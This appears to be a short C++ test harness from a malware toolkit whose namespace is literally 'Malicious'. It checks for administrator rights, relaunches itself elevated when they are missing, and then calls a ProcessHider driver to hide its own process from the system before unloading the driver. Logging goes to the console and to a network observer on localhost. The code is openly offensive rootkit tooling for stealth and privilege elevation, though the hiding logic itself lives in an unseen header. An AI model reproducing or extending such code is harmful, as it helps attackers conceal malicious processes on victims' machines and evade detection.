#include <malicious/ProcessHider.hpp>
#include <system/Uac.hpp>
#include <system/ThisProcess.hpp>
#include <common/Log.hpp>
using namespace Malicious;
using namespace System;

int main()
{
    try
	{
		LOG_THIS_FUNCTION
        LOG.setHeader("TEST HIDEPROC");
	    LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
		LOG.addObserver(new Common::LogToConsole());
        LOG.trace();

        ThisProcess thisProcess;
        if(!System::isAdministrator())
	    {
            LOG << "Trying to run as administrator";
		    System::RunAsAdministrator(thisProcess.getProgramName(), thisProcess.getProgramDir(), true);
		    return EXIT_SUCCESS;
	    }

        LOG << "Hiding this process";
        ProcessHider hider;
        
		SHOW_BOX("Hider result", "Click to hide process");

		hider.hide(thisProcess.getProgramName());

        SHOW_BOX("Hider result", "Click to remove driver");

        hider.remove();

        SHOW_BOX("Hider result", "Driver removed");
	}
    catch(Malicious::DriverError& e)
    {
		LOG << e.what();
    }
	catch(...)
	{
		LOG << "Unknown exception";
	}
}